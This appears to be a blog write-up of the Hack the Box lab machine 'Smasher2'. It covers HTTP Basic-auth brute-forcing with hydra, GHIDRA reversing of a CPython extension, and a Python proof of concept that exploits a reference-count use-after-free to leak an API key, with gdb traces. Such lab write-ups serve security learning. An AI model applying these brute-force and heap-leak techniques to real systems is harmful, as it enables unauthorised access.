---
layout: post
title:  "Hack the Box - Smasher2"
date:   2018-10-01 16:16:01 -0600
categories: hackthebox python heap internals pydecref pyincref reversing hacking writeup
---

<img class="header-img" src="{{ "img/smasher2/home.png" | relative_url }}" />
![Real First Blood? :)](/img/smasher2/1st.png)


Smasher2 is the follow up to one of the best, and hardest boxes, Smasher. So buckle up, shit's about to get hard.

The start of this box required very basic enumeration:

1. `nmap` to discover port `53` and `80`
2. `dirb` on port 80 to discover `/backup`
3. `dig AXFR smasher2.htb @smasher2.htb` to discover `wonderfulsessionmanager.smasher2.htb`

`/backup` was protected by Basic HTTP auth, and there weren't any hints or leads on a username; however, basic fuzzing of `wonderfulsessionmanager.smasher2.htb` didn't bring up any leads either. So, I kicked off `hydra` against `/backup` with a username of `admin`, a password list of `rockyou.txt` and waited*. A while. After an hour or two, the password: `clarabibi` came back.

**note: frankly, I wouldn't recommended bruteforcing HTTP authentication with such a huge password list, especially without a known username. this part was weird.*

Once authenticated, I had access to two files: `auth.py` and `ses.so`. After looking at the files, it appeared that this is what was powering `wonderfulsessionmanager.smasher2.htb`. Unfortunately, `auth.py` had its credentials removed, so some reversing was in order.

`auth.py` was a very basic Flask application that had two endpoints. The first was a simple authentication API which returned an API token on a successfuly auth. The other allowed the executution of `bash` jobs with a valid API token. There were no obvious bugs or exploitable issues with the Flask app itself, so I investigated the `ses.so` file. This was a CPython extension which was imported by `auth.py`. It provided the actual authentication for `auth.py`.

I decided to start with some basic static analysis. This has because much easier for those of us without tens of thousands of dollars to spend on IDA Pro with the release of [GHIDRA](https://ghidra-sre.org). GHIDRA is a free reverse engineering tool from the NSA with a pretty powerful disassembler / decompiler.

After loading the file in GHIDRA, I started by finding the most interesting looking items in the `Functions` window. In this case, those were the two functions called from the Flask app: `SessionManager__init`, and `SessionManager_check_login`. `SessionManager__init` turned out to be innocuous, so my focus fell upon SessionManager_check_login`. To get a more thourough understanding of the function, I renamed functions and variables as I discovered their use. Here's what GHIDRA looked after my first pass:

{% highlight c %}
long * SessionManager_check_login(undefined8 uParm1,undefined8 uParm2)

{
  long lVar1;
  undefined8 *puVar2;
  char has_data;
  char user_is_blocked;
  char data_has_username;
  char data_has_password;
  char user_can_login;
  int arguments;
  int user_login_count;
  int user_login_count_2;
  int username_matches;
  int password_matches;
  long *return_list;
  long *data;
  undefined8 username_raw;
  undefined8 password_raw;
  char *username;
  char *password;
  char *private_username;
  char *private_password;
  long *plVar3;
  long in_FS_OFFSET;
  undefined8 session_manager.self;
  long *post_data;
  long *local1;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  return_list = (long *)PyList_New(2);
  arguments = PyArg_ParseTuple(uParm2,&OO,&session_manager.self,&post_data);
  if (arguments == 0) {
    return_list = (long *)0x0;
    goto LAB_0010250e;
  }
  if ((*(ulong *)(post_data[1] + 0xa8) & 0x20000000) == 0) {
    *post_data = *post_data + -1;
    if (*post_data == 0) {
      (**(code **)(post_data[1] + 0x30))(post_data);
    }
    return_list = (long *)ErrorMsg(PyExc_TypeError,"Expecting a dict!",uParm2);
    goto LAB_0010250e;
  }
  has_data = dict_contains(post_data,&data);
  if (has_data != '\x01') {
    *post_data = *post_data + -1;
    if (*post_data == 0) {
      (**(code **)(post_data[1] + 0x30))(post_data);
    }
    return_list = (long *)ErrorMsg(PyExc_TypeError,"Missing data parameter",uParm2);
    goto LAB_0010250e;
  }
  data = (long *)get_dict_key(post_data,&data);
  user_is_blocked = is_blocked(session_manager.self);
  if (user_is_blocked == '\x01') {
    user_can_login = can_login(session_manager.self);
    if (user_can_login != '\0') {
      set_unblocked(session_manager.self);
      set_login_count(session_manager.self,0);
    }
    plVar3 = (long *)PyBool_FromLong(0);
    *plVar3 = *plVar3 + 1;
    *(long **)return_list[3] = plVar3;
    *data = *data + 1;
    *(long **)(return_list[3] + 8) = data;
  }
  else {
    user_login_count = get_login_count(session_manager.self);
    if (user_login_count < 10) {
      set_last_login(session_manager.self);
      user_login_count_2 = get_login_count(session_manager.self);
      set_login_count(session_manager.self,(long)(user_login_count_2 + 1),
                      (long)(user_login_count_2 + 1));
      if ((*(ulong *)(data[1] + 0xa8) & 0x20000000) == 0) {
        *post_data = *post_data + -1;
        if (*post_data == 0) {
          (**(code **)(post_data[1] + 0x30))(post_data);
        }
        return_list = (long *)ErrorMsg(PyExc_TypeError,"Expect dict paramenter",uParm2);
        goto LAB_0010250e;
      }
      data_has_username = dict_contains(data,"username");
      if (data_has_username != '\x01') {
        *post_data = *post_data + -1;
        if (*post_data == 0) {
          (**(code **)(post_data[1] + 0x30))(post_data);
        }
        return_list = (long *)ErrorMsg(PyExc_TypeError,"Missing username parameter",uParm2);
        goto LAB_0010250e;
      }
      data_has_password = dict_contains(data,"password");
      if (data_has_password != '\x01') {
        *post_data = *post_data + -1;
        if (*post_data == 0) {
          (**(code **)(post_data[1] + 0x30))(post_data);
        }
        return_list = (long *)ErrorMsg(PyExc_TypeError,"Missing password parameter",uParm2);
        goto LAB_0010250e;
      }
      username_raw = get_dict_key(data,"username");
      password_raw = get_dict_key(data,"password");
      username = (char *)PyString_AsString(username_raw);
      password = (char *)PyString_AsString(password_raw);
      private_username = (char *)get_internal_usr(session_manager.self);
      username_matches = strcmp(username,private_username);
      if (username_matches == 0) {
        private_password = (char *)get_internal_pwd(session_manager.self);
        password_matches = strcmp(password,private_password);
        if (password_matches == 0) {
          puVar2 = (undefined8 *)return_list[3];
          username_raw = PyBool_FromLong(1);
          *puVar2 = username_raw;
          *data = *data + 1;
          *(long **)(return_list[3] + 8) = data;
          goto LAB_001024c5;
        }
      }
      puVar2 = (undefined8 *)return_list[3];
      username_raw = PyBool_FromLong(0);
      *puVar2 = username_raw;
      *data = *data + 1;
      *(long **)(return_list[3] + 8) = data;
    }
    else {
      set_blocked(session_manager.self);
      plVar3 = (long *)PyBool_FromLong(1);
      *plVar3 = *plVar3 + 1;
      puVar2 = (undefined8 *)return_list[3];
      username_raw = PyBool_FromLong(0);
      *puVar2 = username_raw;
      *(long **)(return_list[3] + 8) = data;
    }
  }
LAB_001024c5:
  *data = *data + -1;
  if (*data == 0) {
    (**(code **)(data[1] + 0x30))(data);
  }
  *return_list = *return_list + 1;
LAB_0010250e:
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return return_list;
}
{% endhighlight %}

Doing this made spotting potential issues _much_ easier. There were a few methods called within `SessionManager_check_login` that I explored: `set_blocked`, `get_login_count`, `set_unblocked`, `set_login_count`, `can_login`, `set_last_login`, `get_internal_pwd`, and `get_internal_user`. These turned out to be basic getter or setter methods, but `get_internal_pwd` had a small, but powerful bug:
{% highlight c %}
undefined8 get_internal_pwd(undefined8 uParm1)
{
  long *plVar1;
  undefined8 uVar2;
  
  plVar1 = (long *)PyObject_GetAttrString(uParm1,"user_login");
  uVar2 = PyList_GetItem(plVar1,0);
  uVar2 = PyString_AsString(uVar2);
  *plVar1 = *plVar1 + -1;
  if (*plVar1 == 0) {
    (**(code **)(plVar1[1] + 0x30))(plVar1);
  }
  return uVar2;
}

undefined8 get_internal_usr(undefined8 uParm1)
{
  long *plVar1;
  undefined8 uVar2;
  
  plVar1 = (long *)PyObject_GetAttrString(uParm1,"user_login");
  uVar2 = PyList_GetItem(plVar1,0);
  uVar2 = PyString_AsString(uVar2);
  *plVar1 = *plVar1 + -1;
  if (*plVar1 == 0) {
    (**(code **)(plVar1[1] + 0x30))(plVar1);
  }
  return uVar2;
}
{% endhighlight %}

Can you spot the difference? No? That's the point -- `get_internal_pwd` was actually returning the username. This made bruteforcing the account possible, as one only had to guess the correct username. This solution was used by the initial solvers of the box; however, this was an unintended bug, and I wanted to find the real solution.

There wasn't anything obvious sticking out, so it was time to fire up some dynamic analysis and fuzzing. I used `auth.py` and `ses.so` to run the application locally (I just needed to create a `templates` directory with `index.html` and `login.html` files to keep Flask happy).

The first idea I had was [type confusion](https://cwe.mitre.org/data/definitions/843.html). Although this is a common route to exploit interpretered language interop, `ses.so` had pretty robust type checking. Passing `{"data": []}`, `{}`, `{"data":{}}`, etc. all resulted in valid, safe exits. After poking around a little more, I found that `{"data": {"username": [], "password": "X"}}` caused a crash!

Now that I was onto something, I attached `gdb` to see what was happening: `gdb python $(ps aux | grep auth.py | grep -v grep | awk '{print $2}')`. Once attached, I set breakpoints in the areas I was investigating, e.g. `break *SessionManager_check_login+1110`.

Unfortunately, after investigating more closely, I found that this was a dead end.
{% highlight c %}
username_raw = get_dict_key(data,"username");
password_raw = get_dict_key(data,"password");
username = (char *)PyString_AsString(username_raw);
password = (char *)PyString_AsString(password_raw);
private_username = (char *)get_internal_usr(session_manager.self);
username_matches = strcmp(username,private_username);
{% endhighlight %}
One can see the list that was passed as `username` was getting passed into `PyString_AsString`. The [documentation](https://docs.python.org/2/c-api/string.html#c.PyString_AsString) for this method made it pretty clear what was happening: since `username_raw` was not a `PyString`, `PyString_AsString` was returning `NULL`, and `strcmp` failed since the first parameter, `username`, was `NULL`. Back to the drawing board.

I didn't want to completely give up on type confusion, so my next step was to look for potential code paths where the `data` dictionary's type wasn't checked, or was still used after it was checked. There were two scenarios where that happened:

1. If the user was blocked
2. If the user was _about_ to be blocked

The only problem was that `data` was not actually used in any of those code paths, other than being returned so it could be presented in the error message. But in investigating those two areas of the code, something _very_ interesting popped out:
{% highlight c %}
  ...
  user_can_login = can_login(session_manager.self);
  if (user_can_login != '\0') {
    set_unblocked(session_manager.self);
    set_login_count(session_manager.self,0);
  }
  plVar3 = (long *)PyBool_FromLong(0);
  *plVar3 = *plVar3 + 1;
  *(long **)return_list[3] = plVar3;
  *data = *data + 1;
  *(long **)(return_list[3] + 8) = data;

  ...

  set_blocked(session_manager.self);
  plVar3 = (long *)PyBool_FromLong(1);
  *plVar3 = *plVar3 + 1;
  puVar2 = (undefined8 *)return_list[3];
  username_raw = PyBool_FromLong(0);
  *puVar2 = username_raw;
  *(long **)(return_list[3] + 8) = data;
  ...
{% endhighlight %}
Notice that the line `*data = *data + 1;` is missing in the second code path. Further investigating showed that every other non-exception code path _also_ had that line. So, what was it for? Time to dive into [Python internals](https://docs.python.org/2.7/c-api/index.html).

*Python uses [reference counting](https://docs.python.org/2.7/c-api/refcounting.html) in addition to garbage collection. Reference counting is a way for the Python runtime to determine when it's safe to deallocate objects. Once an object's reference count hits 0, the object’s type deallocation function is invoked. These counts are increased by the `Py_INCREF` macro, and decreased by the `Py_DECREF` macro.*

In this case, `*data = *data + 1;` was `Py_INCREF` which increased the number of references to the `data` dictionary. The developer did this because `data` was put into the `return_list` variable, and so shouldn't be deallocated. However, in the other code path there was no `Py_INCREF`! And afterwards, the code hit this:
{% highlight c %}
*data = *data + -1;
if (*data == 0) {
  (**(code **)(data[1] + 0x30))(data);
}
{% endhighlight %}
It was `Py_DECREF`. It decreased the number of references (since this function was returning and no longer needed to reference that variable), and if the number of references was `0`, it would call `(**(code **)(data[1] + 0x30))(data);` We know `data` was a dictionary, which is `PyDict_Type` in CPython. By looking at the [source](https://github.com/python/cpython/blob/a8b89cd0611f2732491a72b37651f110fb0ed8ec/Objects/dictobject.c#L3194), I could see that `0x30` into the type structure was the deallocator, `dict_dealloc`. And that's exactly what would happen if the execution went down this code path. Since there was no `Py_INCREF` when `Py_DECREF` would be called, the reference count would hit `0`, and Python would deallocate that object.

Using this knowledge, I built a quick POC:
{% highlight python %}
import requests

HOST = 'localhost'
PORT = '5000'
BASE_URL = 'http://' + HOST + ':' + PORT

init = requests.get(BASE_URL)
cookies = init.cookies.get_dict()

for i in range(10):
    exploit = requests.post(
            BASE_URL + '/auth', 
            json={"data":{"username": "aaa", "password": "aaa"}},
            headers={'Content-Type': 'application/json'}, 
            cookies=cookies
    )

exploit = requests.post(
        BASE_URL + '/auth', 
        json={"data":{}},
        headers={'Content-Type': 'application/json'}, 
        cookies=cookies
)
{% endhighlight %}
and I successfully crashed the application:
{% highlight shell %}
➜  python auth.py
 * Serving Flask app "auth" (lazy loading)
 * Environment: production
   WARNING: Do not use the development server in a production environment.
   Use a production WSGI server instead.
 * Debug mode: off
 * Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)
127.0.0.1 - - [04/Jun/2019 20:35:26] "GET / HTTP/1.1" 200 -
127.0.0.1 - - [04/Jun/2019 20:35:26] "POST /auth HTTP/1.1" 200 -
127.0.0.1 - - [04/Jun/2019 20:35:26] "POST /auth HTTP/1.1" 200 -
127.0.0.1 - - [04/Jun/2019 20:35:26] "POST /auth HTTP/1.1" 200 -
127.0.0.1 - - [04/Jun/2019 20:35:26] "POST /auth HTTP/1.1" 200 -
127.0.0.1 - - [04/Jun/2019 20:35:26] "POST /auth HTTP/1.1" 200 -
127.0.0.1 - - [04/Jun/2019 20:35:26] "POST /auth HTTP/1.1" 200 -
127.0.0.1 - - [04/Jun/2019 20:35:26] "POST /auth HTTP/1.1" 200 -
127.0.0.1 - - [04/Jun/2019 20:35:26] "POST /auth HTTP/1.1" 200 -
127.0.0.1 - - [04/Jun/2019 20:35:26] "POST /auth HTTP/1.1" 200 -
127.0.0.1 - - [04/Jun/2019 20:35:26] "POST /auth HTTP/1.1" 200 -
Fatal Python error: deletion of interned string failed
[1]    21191 segmentation fault (core dumped)  python auth.py
{% endhighlight %}
I now had some sort of heap-based SIGSEV. The dictionary that Python expected to be there is now `free`'d / deallocated, and cause a crash. In order to exploit this, I had to [dive deeper](https://docs.python.org/2.7/c-api/memory.html).

*A couple important facts on Python:*
*1. Everything on Python is managed on a private heap, managed internally by Python.*
*2. Python's memory manager has different segments for each type of object. So integers, lists, dictionaries, etc. are all managed differently, but together, within the private heap.*
*3. These separate areas are managed like [fast bins](https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/bins_chunks.html#fast-bins): last in, first out.*
*4. This can be seen by reviewing the source code for [various](https://github.com/python/cpython/blob/master/Objects/dictobject.c#L1974] (deallocators)[https://github.com/python/cpython/blob/master/Objects/listobject.c#L360) -- if there is space on the `free_list`, it adds the pointer to the deallocated object to the `free_list` for that type of object.*


Since this code path did _not_ check the "type" of `"data"` passed in the JSON payload, and it dealloc'd that "type" of object from memory (meaning that pointer would now be pointing to a different object of the same "type" of `"data"`), AND `ses.so` returned that point to `auth.py` which printed it to the user, I knew I was on to something. By passing in various types of `"data"`, I should be able read the last item of that "type" created in Python's heap.

After a bit of trial and error with different object types, I was successful with: `{"data": []}`:
{% highlight python %}
import requests

HOST = 'localhost'
PORT = '5000'
BASE_URL = 'http://' + HOST + ':' + PORT

init = requests.get(BASE_URL)
cookies = init.cookies.get_dict()

for i in range(10):
    exploit = requests.post(
            BASE_URL + '/auth', 
            json={"data":{"username": "aaa", "password": "aaa"}},
            headers={'Content-Type': 'application/json'}, 
            cookies=cookies
    )

exploit = requests.post(
        BASE_URL + '/auth', 
        json={"data":[]},
        headers={'Content-Type': 'application/json'}, 
        cookies=cookies
)
if '/api/<api_key>' in exploit.text:
    print(exploit.text)
{% endhighlight %}
resulted in
{% highlight shell %}
➜  python exploit.py
{"authenticated":false,"result":"Cannot authenticate with data: ['/api/<api_key>/job', '1e18cb7c2be07907d12f52e505404081bd902e3af0fd6fd4437275bb71d7fe15', 1559695142] - Too many tentatives, wait 2 minutes!"}
{% endhighlight %}
The last `list` loaded onto Python's heap before the `list` I sent was the one used to initiate the `SessionManager`, which contained the API key!

I verified this in `gdb` by stepping through the deallocation code. I set a breakpoint on the deallocation call: `break* SessionManager_check_login+1281`, and continued the program. In another terminal, I kicked off the exploit: `python exploit.py`, and stepped into the `list_dealloc` function in `gdb`.

*`gdb` makes it really easy to debug Python objects. One can cast objects to `PyObject*` to view their data and members, print local variable names like `op`, and more.*

[list_dealloc](https://github.com/python/cpython/blob/master/Objects/listobject.c#L360) had a local variable `op`, which is the `PyListObject*` that was being deallocated:
{% highlight shell %}
gdb-peda$ p (*(PyListObject*)op)
$23 = {
  ob_refcnt = 0x0, 
  ob_type = 0x55bbf70e2280 <PyList_Type>, 
  ob_size = 0x0, 
  ob_item = 0x0, 
  allocated = 0x0
}
{% endhighlight %}

*`PyListObject` inherits from `PyObject`, which is found implemented [here](https://github.com/python/cpython/blob/master/Include/object.h#L104). `PyObject` has more members "above" `ob_refcnt`, via the define `_PyObject_HEAD_EXTRA`. This define adds pointers to support a doubly-linked list of all the live heap objects for that "type" of `PyObject`.*

I took a look at the start of `list_dealloc`:
{% highlight shell %}
0x000055bbf6e7ebe2 <+18>:	mov    rdx,QWORD PTR [rdi-0x20]
0x000055bbf6e7ebe6 <+22>:	mov    rcx,QWORD PTR [rdi-0x18]
{% endhighlight %}
and found the logic to retreive the forward and backwards looking pointers for the doubly-linked list which could be verified by inspecting the data:
{% highlight shell %}
gdb-peda$ x op-0x20
0x7f2430d34738:	0x00007f2430d31378
gdb-peda$ p *(PyObject *)(0x7f2430d31378+0x20)
$33 = {
  ob_refcnt = 0x4, 
  ob_type = 0x55bbf70e1da0 <PyDict_Type>
}
gdb-peda$ p *(PyObject *)(0x00007f2430d22d50+0x20)
$35 = {
  ob_refcnt = 0x1, 
  ob_type = 0x55bbf70deb40 <PyMethod_Type>
}
{% endhighlight %}
It then updated the `next` and `prev` pointers for the items on that list, effectively "cutting out" the object that was being free'd, and zeroed out the `next` pointer *(if anyone can enlighten me on what the `0xfffffffffffffffe` checks and `mov`s are, I'd be fascinated to know)*:
{% highlight shell %}
0x000055bbf6e7ebe2 <+18>:	mov    rdx,QWORD PTR [rdi-0x20]
0x000055bbf6e7ebe6 <+22>:	mov    rcx,QWORD PTR [rdi-0x18]
0x000055bbf6e7ebea <+26>:	mov    QWORD PTR [rdi-0x10],0xfffffffffffffffe
0x000055bbf6e7ebf2 <+34>:	mov    QWORD PTR [rcx],rdx
0x000055bbf6e7ebf5 <+37>:	mov    rbx,QWORD PTR [rdi-0x20]
0x000055bbf6e7ebf9 <+41>:	mov    rsi,QWORD PTR [rdi-0x18]
0x000055bbf6e7ebfd <+45>:	mov    QWORD PTR [rbx+0x8],rsi
0x000055bbf6e7ec01 <+49>:	mov    QWORD PTR [rdi-0x20],0x0
{% endhighlight %}
Next, it verified that the list was empty and continued to the `free_list` check (if the list wasn't empty, it would have ran through the list and deallocated each item):
{% highlight shell %}
   0x55bbf6e7ecfa <list_dealloc+298>:	nop    WORD PTR [rax+rax*1+0x0]
   0x55bbf6e7ed00 <list_dealloc+304>:	
    movsxd r9,DWORD PTR [rip+0x2c0919]        # 0x55bbf713f620 <numfree.lto_priv.44>
   0x55bbf6e7ed07 <list_dealloc+311>:	mov    r10,QWORD PTR [rbp+0x8]
=> 0x55bbf6e7ed0b <list_dealloc+315>:	cmp    r9d,0x4f
   0x55bbf6e7ed0f <list_dealloc+319>:	jg     0x55bbf6e7ed40 <list_dealloc+368>
   0x55bbf6e7ed11 <list_dealloc+321>:	cmp    r10,QWORD PTR [rip+0x248090]        # 0x55bbf70c6da8
   0x55bbf6e7ed18 <list_dealloc+328>:	jne    0x55bbf6e7ed40 <list_dealloc+368>
   0x55bbf6e7ed1a <list_dealloc+330>:	lea    r11d,[r9+0x1]
gdb-peda$ p numfree
$48 = 0x3
{% endhighlight %}
Since `numfree` was less than `PyList_MAXFREELIST`, Python added the pointer `op` to the `freelist`: `free_list[numfree++] = op;`.

*As to the specifics as to why the list that's passed to `SessionManager_init` needs to be re-allocated (and thus re-uses the pointer that we just freed), I'm not 100% sure. If someone is more familiar with Python internals, I would love to know. But, it can clearly be seen if one set watchpoints on that memory in `gdb`:*
{% highlight shell %}
gdb-peda$ awatch *0x7facbab56bd8  # This is the address of `op` from above, when we were in the list_dealloc function
gdb-peda$ awatch *0x7facbab56bd8-0x20
gdb-peda$ c
{% endhighlight %}
_Step through until the end of `PyList_New` completes allocation, plus assignment._
{% highlight shell %}
gdb-peda$ print *(PyListObject*)0x7facbab56bd8
$13 = {
  ob_refcnt = 0x1, 
  ob_type = 0x55d10570a280 <PyList_Type>, 
  ob_size = 0x3, 
  ob_item = 0x7facb4022b20, 
 allocated = 0x3
}

gdb-peda$ print *(PyStringObject*)(*(PyListObject*)0x7facbab56bd8)->ob_item[1]
$16 = {
  ob_refcnt = 0x2, 
  ob_type = 0x55d105709f40 <PyString_Type>, 
  ob_size = 0x40, 
  ob_shash = 0xffffffffffffffff, 
  ob_sstate = 0x0, 
  ob_sval = "1"
}
gdb-peda$ x/32s (*(PyStringObject*)(*(PyListObject*)0x7facbab56bd8)->ob_item[1])->ob_sval
0x7facbab91bb4:	"1e18cb7c2be07907d12f52e505404081bd902e3af0fd6fd4437275bb71d7fe15"
{% endhighlight %}

With the API token, it was trivial to run a bash job and get an initial shell, and `user.txt`. 

The final part of Smasher2 was a pretty fun kernel module exploit, but this post is long enough, so maybe I'll leave it for another time :) (or check out another writeup, like [Snowscan's](https://snowscan.io)!)

_fin_
